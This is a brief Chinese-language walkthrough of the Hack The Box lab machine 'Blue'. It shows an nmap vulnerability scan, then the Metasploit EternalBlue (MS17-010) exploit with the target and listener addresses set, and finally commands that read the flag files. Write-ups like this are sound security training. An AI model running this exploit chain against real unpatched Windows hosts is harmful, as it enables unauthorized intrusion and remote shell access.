---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Blue"
linktitle: "Blue"
date: 2022-07-02T10:35:40+08:00
type: book
summary: ""
test: 
---


namp

```bash
sudo nmap -T4 -p- -sV --script vuln -vv 10.10.10.40
```

![](image/image_pQZ-DR3u60.png)

nmap识别到存在永恒之蓝漏洞(ms17-010)

![](image/image_uopAst56aj.png)

msf

use auxiliary/scanner/smb/smb\_version

![](image/image_ABMwYFUDuo.png)

use exploit/windows/smb/ms17\_010\_eternalblue

```bash
set rhosts 10.10.10.40
set lhost 10.10.14.12

run

```

![](image/image_WibfFJfdFY.png)

![](image/image_diHKv15dWX.png)

flag

```bash
cd C:\Users | dir

type .\Administrator\Desktop\root.txt && type .\haris\Desktop\user.txt
```

![](image/image_cEkrJ8YZuQ.png)
